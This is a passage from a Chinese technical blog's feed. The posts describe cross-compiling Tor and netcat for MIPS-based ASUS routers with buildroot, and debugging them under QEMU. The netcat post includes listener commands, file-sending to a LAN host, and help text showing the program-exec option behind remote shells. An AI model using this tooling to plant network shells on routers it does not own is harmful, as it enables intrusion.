<code>https://bjglife.blogspot.nl/2015/01/linux-porting-openssl-to-mips-platform.html</code><br>===&gt; 文章里面选择了这个 <code>Enable large file (files &gt; 2 GB) support</code> 想必和错误有关</p><p>之前编译buildroot:<br>    choose:</p><pre><code>Target Architecture (MIPS (little endian))  ---&gt;Target Architecture Variant (mips 32)  ---&gt;</code></pre><p>生成 =&gt; /root/Desktop/8/buildroot-2011.05/output/host/usr/bin<br>现在编译buildroot:<br>    choose:</p><pre><code>Target Architecture (MIPS (little endian))  ---&gt;Target Architecture Variant (mips 32)  ---&gt;Toolchain type (Buildroot toolchain)  ---&gt; [*] Enable large file (files &gt; 2 GB) support</code></pre><p>生成 =&gt; /root/Desktop/88/buildroot-2011.05/output/host/usr/bin </p><p>变量</p><pre><code>$ export MIPSEL_LINUX_PATH=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin    ##### unset MIPSEL_LINUX_PATH$ export MIPSEL_LINUX_PATH2=/root/Desktop/88/buildroot-2011.05/output/host/usr/bin    ##### unset MIPSEL_LINUX_PATH2</code></pre><p>再次交叉编译 :</p><pre><code>$ ./Configure no-async --prefix=/root/Desktop/cross/yes/openssl2 --cross-compile-prefix=$MIPSEL_LINUX_PATH2/mipsel-linux- linux-mips32</code></pre><p>找错 <code>https://github.com/openssl/openssl/issues/1607</code>  ==&gt; add <code>no-async</code>  # 不加否则错误<br>$ make<br>$ make install<br>ok =&gt; /root/Desktop/cross/yes/openssl2</p><p>到openssl2下面执行/root/Desktop/cross/yes/openssl2/lib<br>$ file libssl.so.1.1</p><pre><code>libssl.so.1.1: ELF 32-bit LSB shared object, MIPS, MIPS32 version 1 (SYSV), dynamically linked, with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x3040000, not stripped</code></pre><p>ok编译成功</p><p>对了 这边需要很强调一点是 编译哪个版本的buildroot,即使编译buildroot时多选了几个选项,都需要根据Buildroot编译后的bin/下面的文件，进行对<code>openssl</code>再次交叉编译，不然出现 <code>You will probably need to install openssl-devel too.</code></p><hr><h2 id="0x03-交叉编译-libevent"><a href="#0x03-交叉编译-libevent" class="headerlink" title="0x03 交叉编译 libevent"></a>0x03 交叉编译 libevent</h2><pre><code>$ ./configure --prefix=/root/Desktop/cross/yes/libevent CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip --host=mipsel-linux </code></pre><p>错误 </p><pre><code>bufferevent_openssl.c:66:10: fatal error: &#39;openssl/bio.h&#39; file not found</code></pre><p>找错 <code>https://github.com/libevent/libevent/issues/465</code><br>需要配合 <code>openssl</code> 加上 <code>CPPFLAGS</code> and <code>LDFLAGS</code></p><p>再次交叉编译 </p><pre><code>$ ./configure --prefix=/root/Desktop/cross/yes/libevent CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip --host=mipsel-linux CPPFLAGS=-I/root/Desktop/cross/yes/openssl2/include LDFLAGS=-L/root/Desktop/cross/yes/openssl2/lib</code></pre><p>即:</p><pre><code>$ ./configure --prefix=/root/Desktop/cross/yes/libevent \CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc \AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar \RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib \LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld \STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip \--host=mipsel-linux \CPPFLAGS=-I/root/Desktop/cross/yes/openssl2/include \LDFLAGS=-L/root/Desktop/cross/yes/openssl2/lib</code></pre><p>警告 </p><pre><code>/root/Desktop/cross/yes/openssl2/lib/libcrypto.so: warning: gethostbyname is obsolescent, use getnameinfo() instead.</code></pre><p>$ make<br>$ make install<br>ok=&gt; /root/Desktop/cross/yes/openssl2</p><p>到libevent下面执行/root/Desktop/cross/yes/libevent/lib<br>$ file libevent-2.1.so.6.0.2</p><pre><code>libevent-2.1.so.6.0.2: ELF 32-bit LSB shared object, MIPS, MIPS32 version 1 (SYSV), dynamically linked, with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x3040000, not stripped</code></pre><p><code>编译成功</code></p><h2 id="0x04-交叉编译-zlib"><a href="#0x04-交叉编译-zlib" class="headerlink" title="0x04 交叉编译 zlib"></a>0x04 交叉编译 zlib</h2><pre><code>$ ./configure --prefix=/root/Desktop/cross/yes/zlib$ CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib</code></pre><p>$ make install<br>到zlib目录/root/Desktop/cross/yes/zlib/lib里面执行<br>$ file libz.so.1.2.11 </p><pre><code>libz.so.1.2.11: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, not stripped</code></pre><p>这根本不是mips属性的,编译错了zlib<br>如果交叉编译成功的话,属性应该是有<code>MIPS32 version</code>。</p><p>重新交叉编译 zlib</p><pre><code>$ CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib ./configure --prefix=/root/Desktop/cross/yes/zlib</code></pre><p>$ make<br>$ make install<br>到zlib目录里面执行/root/Desktop/cross/yes/zlib/lib<br>$ file libz.so.1.2.11 </p><pre><code>libz.so.1.2.11: ELF 32-bit LSB shared object, MIPS, MIPS32 version 1 (SYSV), dynamically linked, with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x3040000, not stripped</code></pre><p>编译成功</p><hr><h2 id="0x05-交叉编译-tor"><a href="#0x05-交叉编译-tor" class="headerlink" title="0x05 交叉编译 tor"></a>0x05 交叉编译 tor</h2><pre><code>$ CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip ./configure --host=mipsel-linux --disable-tool-name-check --prefix=/root/Desktop/cross/yes/tor --enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent --enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 --enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib</code></pre><p><code>or</code></p><pre><code>$  ./configure --host=mipsel-linux --disable-tool-name-check --prefix=/root/Desktop/cross/yes/tor CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip --enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent --enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 --enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib</code></pre><p>即:</p><pre><code>$ CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc \AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar \RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib \LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld \STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip \./configure --host=mipsel-linux --disable-tool-name-check --prefix=/root/Desktop/cross/yes/tor \--enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent \--enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 \--enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib \</code></pre><p>错误 :</p><pre><code>checking for mipsel-linux-gcc... /mipsel-linux-gccchecking whether the C compiler works... noconfigure: error: in `/root/Desktop/9/tor-0.3.1.8&#39;:configure: error: C compiler cannot create executablesSee &#39;config.log&#39; for more details</code></pre><p>检查config.log :<br>发现: </p><pre><code>configure:3752: checking for C compiler versionconfigure:3761: /mipsel-linux-gcc --version &gt;&amp;5./configure: line 3763: /mipsel-linux-gcc: No such file or directoryconfigure:3772: $? = 127</code></pre><p>???? $MIPSEL_LINUX_PATH2 根本就没识别,<br>export 查看所有变量 发现???根本没有$MIPSEL_LINUX_PATH2。 我不是刚才编译zlib的时候才用了吗?<br>再次设置变量 </p><pre><code>export MIPSEL_LINUX_PATH2=/root/Desktop/88/buildroot-2011.05/output/host/usr/bin</code></pre><p>重新交叉编译tor<br>没错误<br>$ make 后错误:</p><pre><code>configure: WARNING: Unable to find liblzma.checking for ZSTD... noconfigure: WARNING: Unable to find libzstdsrc/ext/keccak-tiny/keccak-tiny-unrolled.c: In function &#39;xorin8&#39;:src/ext/keccak-tiny/keccak-tiny-unrolled.c:105: error: &#39;for&#39; loop initial declaration used outside C99 mode</code></pre><p>查看config.log 发现:</p><pre><code>checking for /root/Desktop/88/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc option to accept ISO C89... (cached) none neededchecking for /root/Desktop/88/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc option to accept ISO C99... unsupported</code></pre><p>gcc版本太低了? 不支持?难道又要重新编译buildroot?</p><p>重新编译buildroot 加上一些选项:<br>choose:</p><pre><code>Target Architecture (MIPS (little endian) or MIPSEL)  ---&gt;Target Architecture Variant (mips 32)  ---&gt;Toolchain type (Buildroot toolchain)  ---&gt; [*] Build/install a shared libgcc?        default)Toolchain type (Buildroot toolchain)  ---&gt; [*] Enable MMU supportToolchain type (Buildroot toolchain)  ---&gt; [*] Use software floatinf point by default Toolchain type (Buildroot toolchain)  ---&gt; [*] Enable large file (files &gt; 2 GB) supportToolchain type (Buildroot toolchain)  ---&gt; -*- Enable WCHAR supportToolchain type (Buildroot toolchain)  ---&gt; [*] Enable toolchain locale/i18n supportToolchain type (Buildroot toolchain)  ---&gt; [*] Enable &#39;program invocation name&#39; supportToolchain type (Buildroot toolchain)  ---&gt; [*] Enable C++ supportToolchain type (Buildroot toolchain)  ---&gt; [*] Enable stack protection supportGCC compiler Version --&gt; gcc 4.6.x</code></pre><p><strong>buildroot choose</strong><br><img src="/2017/12/07/交叉编译tor在路由器上使用/2011-05-toolchain_choose.png" alt="buildroot choose"></p><p>设置变量 :</p><pre><code>$ export MIPSEL_LINUX_PATH3=/root/Desktop/888/buildroot-2011.05/output/host/usr/bin</code></pre><pre><code>$ ./configure --host=mipsel-linux --disable-tool-name-check --prefix=/root/Desktop/cross/yes/tor CC=&quot;$MIPSEL_LINUX_PATH3/mipsel-linux-gcc -std=gnu99&quot; AR=$MIPSEL_LINUX_PATH3/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH3/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH3/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH3/mipsel-linux-strip --enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent --enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 --enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib --disable-gcc-hardening</code></pre><p>即:</p><pre><code>./configure --host=mipsel-linux --disable-tool-name-check \--prefix=/root/Desktop/cross/yes/tor \CC=&quot;$MIPSEL_LINUX_PATH3/mipsel-linux-gcc -std=gnu99&quot; \AR=$MIPSEL_LINUX_PATH3/mipsel-linux-ar \RANLIB=$MIPSEL_LINUX_PATH3/mipsel-linux-ranlib \LD=$MIPSEL_LINUX_PATH3/mipsel-linux-ld \STRIP=$MIPSEL_LINUX_PATH3/mipsel-linux-strip \--enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent \--enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 \--enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib \--disable-gcc-hardening</code></pre><p>$ make 后报错:</p><pre><code>src/common/compress_lzma.c:22:18: fatal error: lzma.h: No such file or directorycompilation terminated.make[1]: *** [src/common/compress_lzma.o] Error 1</code></pre><p>难道版本问题吗?<br><code>tor-0.2.5.15</code> 版本<br><code>https://dist.torproject.org/tor-0.2.5.15.tar.gz</code><br>make 后错误:</p><pre><code>src/common/aes.c:156:20: error: field &#39;evp&#39; has incomplete typesrc/common/aes.c: In function &#39;evaluate_ctr_for_aes&#39;:src/common/aes.c:259:5: warning: implicit declaration of function &#39;AES_ctr128_encrypt&#39; [-Wimplicit-function-declaration]make[1]: *** [src/common/aes.o] Error 1</code></pre><p>这不是以前遇到的错误,不是缺少什么需要交叉编译的库,而是 每个版本不同导致错误也不同…….</p><p><code>tor-0.2.9.13</code> 版本<br><code>https://dist.torproject.org/tor-0.2.9.13.tar.gz</code></p><pre><code>./configure --host=mipsel-linux --disable-tool-name-check --prefix=/root/Desktop/cross/yes/tor CC=&quot;$MIPSEL_LINUX_PATH3/mipsel-linux-gcc -std=gnu99&quot; AR=$MIPSEL_LINUX_PATH3/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH3/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH3/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH3/mipsel-linux-strip --enable-static-libevent --with-libevent-dir=/root/Desktop/cross/yes/libevent2 --enable-static-openssl --with-openssl-dir=/root/Desktop/cross/yes/openssl2 --enable-static-zlib --with-zlib-dir=/root/Desktop/cross/yes/zlib2 --disable-gcc-hardening</code></pre><p><strong>./configure</strong><br><img src="/2017/12/07/交叉编译tor在路由器上使用/configure_tor.png" alt="configure"></p><p>make 报警告</p><pre><code>/root/Desktop/9/ttor-0.2.9.13/src/common/compat.c:864: warning: the use of OBSOLESCENT &#39;utime&#39; is discouraged, use `utimes&#39;/root/Desktop/cross/yes/openssl2/lib/libcrypto.a(b_sock.o): In function &#39;BIO_gethostbyname&#39;:b_sock.c:(.text+0x80): warning: gethostbyname is obsolescent, use getnameinfo() instead.</code></pre><p>make install<br>但是！！！！！！！！！！！！！！！！<br>交叉编译成功了<br>$ file tor</p><pre><code>tor: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked (uses shared libs), with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x3040000, not stripped</code></pre><p><strong>tor</strong><br><img src="/2017/12/07/交叉编译tor在路由器上使用/file_tor.png" alt="tor"></p><p>tor <code>9468 kb</code><br>压缩传到http网盘上去 tor.zip <code>3730 kb</code></p><p><code>http://www98.zippyshare.com/d/tHqb09lT/39660/tor.zip</code><br><code>http://www54.zippyshare.com/d/59vM7raQ/19523/tor.tar.gz</code></p><p>路由器上运行<code>tor</code></p><pre><code>admin@RT-AC66U: unzip tor.zip     =&gt; unzip: invalid zip magic 4F44213Cadmin@RT-AC66U:/tmp/home/root# tar zxvf tor.tar.gz    =&gt; tar: invalid gzip magic</code></pre><p>开个远程机器吧,然后 </p><pre><code>cd /tmp python -m SimpleHTTPServer mv tor /tmpwget http://ip/tor 即可.</code></pre><p><strong>running tor</strong><br><img src="/2017/12/07/交叉编译tor在路由器上使用/router_tor.png" alt="running tor"></p><p>之前我怀疑传到路由器上的tor运行时需要某些库文件的,运行发现是不需要的</p><p>但是还是有segmentation fault。<br>还是要用QEMU模拟MIPS测试….</p><h2 id="0x06-qemu模拟mips运行tor"><a href="#0x06-qemu模拟mips运行tor" class="headerlink" title="0x06 qemu模拟mips运行tor"></a>0x06 qemu模拟mips运行tor</h2><p>转到Ubuntu的<br>拷贝buildroot编译成的rootfs.tar（buildroot-2011.05 /output/ images）<br>里面有个lib文件夹，将里面的链接库sudo mv * /lib/</p><p>之后直接运行TOR（qemu的安装后会自动识别MIPS类型的文件）<br>在Ubuntu中运行qemu<br><img src="/2017/12/07/交叉编译tor在路由器上使用/running_tor_in_ubuntu.png" alt="running tor"></p><p>QEMU模拟MIPS运行TOR完美运行成功！</p><p>问题来了为什么在路由器上运行失败segmentation fault呢？</p>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 交叉编译 </tag>
            
            <tag> 路由器 </tag>
            
            <tag> tor </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>交叉编译netcat在路由器上使用 - 从入门到放弃再到success</title>
      <link href="/2017/11/27/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91netcat%E5%9C%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B8%8A%E4%BD%BF%E7%94%A8%20-%20%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E5%86%8D%E5%88%B0success/"/>
      <url>/2017/11/27/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91netcat%E5%9C%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B8%8A%E4%BD%BF%E7%94%A8%20-%20%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E5%86%8D%E5%88%B0success/</url>
      <content type="html"><![CDATA[<h2 id="0x00-路由器架构"><a href="#0x00-路由器架构" class="headerlink" title="0x00 路由器架构"></a>0x00 路由器架构</h2><p>Author : Sparrow<br>Time : 2017-11-27 22:25:51<br>Router Model : RT-N12<br>Router CPU : MIPS32</p><pre><code>admin@RT-N12:/tmp/home/rootcat /proc/cpuinfosystem type             : Broadcom BCM53572 chip rev 1 pkg 8processor               : 0cpu model               : MIPS 74K V4.9BogoMIPS                : 149.91wait instruction        : nomicrosecond timers      : yestlb_entries             : 32extra interrupt vector  : nohardware watchpoint     : yesASEs implemented        : mips16 dspshadow register sets    : 1VCED exceptions         : not availableVCEI exceptions         : not availableunaligned_instructions  : 51078121dcache hits             : 2147483648dcache misses           : 0icache hits             : 2147483648icache misses           : 0instructions            : 2147483648</code></pre><a id="more"></a><h2 id="0x01-先编译buildroot"><a href="#0x01-先编译buildroot" class="headerlink" title="0x01 先编译buildroot"></a>0x01 先编译buildroot</h2><p>可知<code>路由器CPU</code>为 <code>MIPS</code>。由同事告知可以先编译<code>buildroot</code>生成的gcc之后再指定编译<code>netcat</code>，这样可以在路由器上运行。</p><p><code>折腾</code>之路由此开始</p><p>下载buildroot</p><ul><li><a href="https://buildroot.org/downloads/buildroot-2017.08.tar.gz" target="_blank" rel="noopener">https://buildroot.org/downloads/buildroot-2017.08.tar.gz</a></li></ul><!-- more --><p>后编译</p><pre><code>make menuconfig</code></pre><p>出现</p><pre><code>&#39;make menuconfig&#39; requires the ncurses libraries </code></pre><p>Centos 下需要安装</p><pre><code>yum install ncurses-devel -y </code></pre><p>若出现这个</p><pre><code>Your Perl installation is not complete enough; at least the followingmodules are missing:         Data::Dumper         ExtUtils::MakeMaker         Thread::Queue</code></pre><p>解决</p><pre><code>yum install &#39;perl(Data::Dumper)&#39; -y yum install &#39;perl(ExtUtils::MakeMaker)&#39; -y yum install &#39;perl(Thread::Queue)&#39; -y </code></pre><p>运行</p><pre><code>cd buildroot-2017.08make manuconfig </code></pre><p><strong>Buildroot Configuration</strong><br><img src="/2017/11/27/交叉编译netcat在路由器上使用 - 从入门到放弃再到success/Buildroot_Configuration.png" alt="Buildroot Configuration"></p><p><strong>选择 Target options</strong><br><img src="/2017/11/27/交叉编译netcat在路由器上使用 - 从入门到放弃再到success/Target_options.png" alt="Target options"></p><pre><code>Target Architecture        ---&gt;     `MIPS (little endian)` Target Architecture Variant    ---&gt;     `Generic MIPS32 ` `</code></pre><p>make 三十分钟之后ok.<br>猜测<code>MIPS (little endian)</code> ，因为尝试编译了很多次才发现的，血泪教训。而路由器使用<code>MIPS</code>编译buildroot的时候会有很多选择，各自生成的gcc也不同。如下：</p><pre><code>mips64 big endian       mips64 little endianmips64-linux-gcc        mips64el-linux-gccmips big endian         mips little endian    mips-linux-gcc          mipsel-linux-gcc    </code></pre><p>选择mips32 little endian 即会生成mipsel-linux-gcc。</p><p><strong>Toolchian 选择3.2 (里面最低内核版本)</strong><br><img src="/2017/11/27/交叉编译netcat在路由器上使用 - 从入门到放弃再到success/Toolchain.png" alt="Toolchian"></p><pre><code>Kernel Headers    ---&gt;     `Linux 3.2.x kernel headers`  `</code></pre><p>开始编译</p><pre><code>make</code></pre><p>编译完成结尾显示</p><pre><code>...../usr/bin/install -m 0644 support/misc/target-dir-warning.txt /root/Desktop/6_mipsel_little/buildroot-2017.08/output/target/THIS_IS_NOT_YOUR_ROOT_FILESYSTEM</code></pre><p>编译之后生成</p><pre><code>./buildroot-2017.08/output/host/bin/    ：    mipsel-linux-gcc    mipsel-linux-ranlib     mipsel-linux-ar    mipsel-linux-ld     mipsel-linux-strip and./buildroot-2017.08/output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/  ：    ld-uClibc.so.0 -&gt; ld-uClibc.so.1    ld-uClibc.so.1 -&gt; ld-uClibc-1.0.26.so    ld-uClibc-1.0.26.so    libc.so.0 -&gt; libuClibc-1.0.26.so    libc.so.1 -&gt; libuClibc-1.0.26.so    libuClibc-1.0.26.so</code></pre><h2 id="0x02-编译netcat"><a href="#0x02-编译netcat" class="headerlink" title="0x02 编译netcat"></a>0x02 编译netcat</h2><p>下载netcat</p><pre><code>wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download -O netcat-0.7.1.tar.gz</code></pre><p>编译netcat</p><pre><code>cd netcat-0.7.1./configuremake CC=/root/Desktop/buildroot-2017.08/output/host/bin/mips64el-linux-gcc</code></pre><p>不行的话就全部指定</p><pre><code>cd netcat-0.7.1 CC=/root/Desktop/6_mipsel_little/buildroot-2017.08/output/host/bin/mipsel-linux-gcc RANLIB=/root/Desktop/6_mipsel_little/buildroot-2017.08/output/host/bin/mipsel-linux-ranlib AR=/root/Desktop/6_mipsel_little/buildroot-2017.08/output/host/bin/mipsel-linux-ar LD=/root/Desktop/6_mipsel_little/buildroot-2017.08/output/host/bin/mipsel-linux-ld STRIP=/root/Desktop/6_mipsel_little/buildroot-2017.08/output/host/bin/mipsel-linux-strip ./configure --host=mipsel-linuxmake</code></pre><p>编译之后生成</p><pre><code>cd src file ./netcat     ./netcat: ELF 32-bit LSB executable, MIPS, N32 `MIPS64` version 1 (SYSV), dynamically linked (uses shared libs), with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x3040000, not stripped./netcat     bash: ./netcat: cannot execute binary file</code></pre><p><code>telnet</code>登录路由器，使用wget 下载我的netcat（不可以传到<code>https的网络盘</code>，因为路由上的wget不支持https。例如<code>https://dropfile.to</code>或者其他，一定传http类型网站例如<code>http://s.dropcanvas.com</code>）</p><p>之后发现<code>./netcat</code> 可以运行，但是 ：</p><pre><code>admin@RT-N12:/tmp/home/root# ./netcatCmd Line : -lvvp 5555segmentation faultadmin@RT-N12:/tmp/home/root# ./netcat_mips_little -hGNU netcat 0.7.1, a rewrite of the famous networking tool.Basic usages:connect to somewhere:  ./netcat_mips_little [options] hostname port [port] ...listen for inbound:    ./netcat_mips_little -l -p port [options] [hostname] [port] ...admin@RT-N12:/tmp/home/root# ./netcat_mips_little 192.168.19.113 5555 &lt; 1.txtsegmentation fault</code></pre><p>只有-h参数可用（心中万只草泥马飞奔而过）,不然都是<code>segmentation fault</code></p><p>无法知道错误，大神又告诉我，<code>Qemu</code>可以模拟MIPS运行netcat</p><h2 id="0x03-转到Ubuntu"><a href="#0x03-转到Ubuntu" class="headerlink" title="0x03 转到Ubuntu"></a>0x03 转到Ubuntu</h2><pre><code>sudo apt-get install qemu    ==&gt;        /usr/bin/qemu-system-i386        /usr/bin/qemu-mipsel        /usr/bin/qemu*</code></pre><p>出错</p><pre><code>sudo /usr/bin/qemu-mipsel netcat_mipsel_little    =&gt;  /lib/ld-uClibc.so.0: No such file or directory</code></pre><p>解决（<code>ld-uClibc-1.0.26.so</code>在上面已经提到了 在<code>./buildroot-2017.08/output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/</code>里）</p><pre><code>sudo mv ld-uClibc-1.0.26.so /lib/sudo chown -R root:root /lib/ld-uClibc-1.0.26.sosudo ln -s /lib/ld-uClibc-1.0.26.so /lib/ld-uClibc.so.0</code></pre><p>出错</p><pre><code>sudo /usr/bin/qemu-mipsel netcat_mipsel_little    =&gt;  /home/db/Desktop/netcat_mipsel_little: can&#39;t load library &#39;libc.so.0&#39;</code></pre><p>解决</p><pre><code>sudo mv libuClibc-1.0.26.so /lib/            sudo chown -R root:root /lib/libuClibc-1.0.26.sosudo ln -s /lib/libuClibc-1.0.26.so /lib/libc.so.0</code></pre><p>但是但是 运行</p><pre><code>sudo /usr/bin/qemu-mipsel netcat_mipsel_little --helpGNU netcat 0.7.1, a rewrite of the famous networking tool.Basic usages:connect to somewhere:  netcat_mipsel_little [options] hostname port [port] ...listen for inbound:    netcat_mipsel_little -l -p port [options] [hostname] [port] ...tunnel to somewhere:   netcat_mipsel_little -L hostname:port -p port [options]Mandatory arguments to long options are mandatory for short options too.Options:  -c, --close                close connection on EOF from stdin  -e, --exec=PROGRAM         program to exec after connect  -g, --gateway=LIST         source-routing hop point[s], up to 8  -G, --pointer=NUM          source-routing pointer: 4, 8, 12, ...  -h, --help                 display this help and exit  -i, --interval=SECS        delay interval for lines sent, ports scanned  -l, --listen               listen mode, for inbound connects  -L, --tunnel=ADDRESS:PORT  forward local port to remote address.....sudo /usr/bin/qemu-mipsel netcat_mipsel_little -lvvp 555orsudo /usr/bin/qemu-mipsel netcat_mipsel_little 192.168.19.113 5555 &lt; /home/db/Desktop/netcat_mipsel_little    ==&gt;         Unsupported setsockopt level=65535 optname=128        Error: Couldn&#39;t create connection (err=-2): Protocol not available</code></pre><p><code>????????</code>  –help 没问题，其他参数就不行?</p><p><code>然后大神告诉我，可能路由器的Linux内核太低了,处理器mipsel也不支持buildroot编译内核3.2的,我看了一下是2.6.32的，而我编译的buildroot选择Linux内核是3.2，最高可选4.4。妈的 buildroot可选内核都没2.6.32，这让我怎么搞 !</code></p><p><code>Fri 24 Nov 2017 07:19:57 AM EST</code></p><p>周末玩荒野行动PC版两局都是第二，差点吃鸡….气死我了 </p><p>周一再搞 ， 发现<br>….<br><a href="https://buildroot.org/downloads/buildroot-2009.02.tar.gz" target="_blank" rel="noopener">https://buildroot.org/downloads/buildroot-2009.02.tar.gz</a><br>最低 -&gt; Linux 2.6.35.x kernel header -&gt; 无法编译</p><p>但是 ！！！！<br>这个版本</p><pre><code>https://buildroot.org/downloads/buildroot-2012.05.tar.gz</code></pre><p>最低 -&gt; <code>Linux 2.6.35.x kernel header</code> -&gt; <code>编译成功</code><br>编译之后上传路由器 成功监听端口了,其它参数皆可正常使用，不会出现 <code>segmentation fault</code>.<br><a href="http://s.dropcanvas.com/1000000/923000/922746/netcat_2011_05" target="_blank" rel="noopener">http://s.dropcanvas.com/1000000/923000/922746/netcat_2011_05</a></p><p>Nice!!!! </p><p><strong>running netcat</strong><br><img src="/2017/11/27/交叉编译netcat在路由器上使用 - 从入门到放弃再到success/router_netcat.png" alt="running netcat"><br>(AC66U and RT-N12 一樣的CPU)</p><p>这里还有个小点，放到Ubuntu的时候 使用qemu-mipsel执行netcat 依旧无法使用，猜测qemu版本问题，<br>我这个是2.5,官网已经2.11了，但是我apt-get install qemu时说此版本是最高了……估计从官网下载编译可以运行的。</p><pre><code># sudo /usr/bin/qemu-mipsel netcat_2011_05 -l -p 555Unsupported setsockopt level=65535 optname=128Error: Couldn&#39;t setup listening socket (err=-2)</code></pre><p>卸载重装qemu</p><pre><code>sudo apt-get remove --auto-remove qemuwget https://download.qemu.org/qemu-2.10.1.tar.xztar xvJf qemu-2.10.1.tar.xzcd qemu-2.10.1./configuremake# cd qemu-2.10.1/mipsel-linux-user# mipsel-linux-user ./qemu-mipsel /home/db/Desktop/netcat_2011_05qemu: uncaught target signal 11 (Segmentation fault) - core dumped[1]    61221 segmentation fault (core dumped)  ./qemu-mipsel /home/db/Desktop/netcat_2011_05....还有错误  不管这个了</code></pre>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 交叉编译 </tag>
            
            <tag> netcat </tag>
            
            <tag> 路由器 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>重新出发</title>
      <link href="/2017/11/26/%E9%87%8D%E6%96%B0%E5%87%BA%E5%8F%91/"/>
      <url>/2017/11/26/%E9%87%8D%E6%96%B0%E5%87%BA%E5%8F%91/</url>
      <content type="html"><![CDATA[<p><strong>好久不写博客了，CSDN都1年半没更新啦。</strong><br><a id="more"></a></p><blockquote><p><strong>BLOG</strong> </p><ul><li><strong>Github  : <a href="https://github.com/sp4rr0w" target="_blank" rel="noopener">https://github.com/sp4rr0w</a></strong></li><li><strong>CSDN    : <a href="http://blog.csdn.net/隐藏" target="_blank" rel="noopener">http://blog.csdn.net/隐藏</a></strong></li></ul></blockquote><p><strong>博客重启,就在此刻</strong></p>]]></content>
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Blog Install</title>
      <link href="/2017/11/25/Blog%20Install/"/>
      <url>/2017/11/25/Blog%20Install/</url>
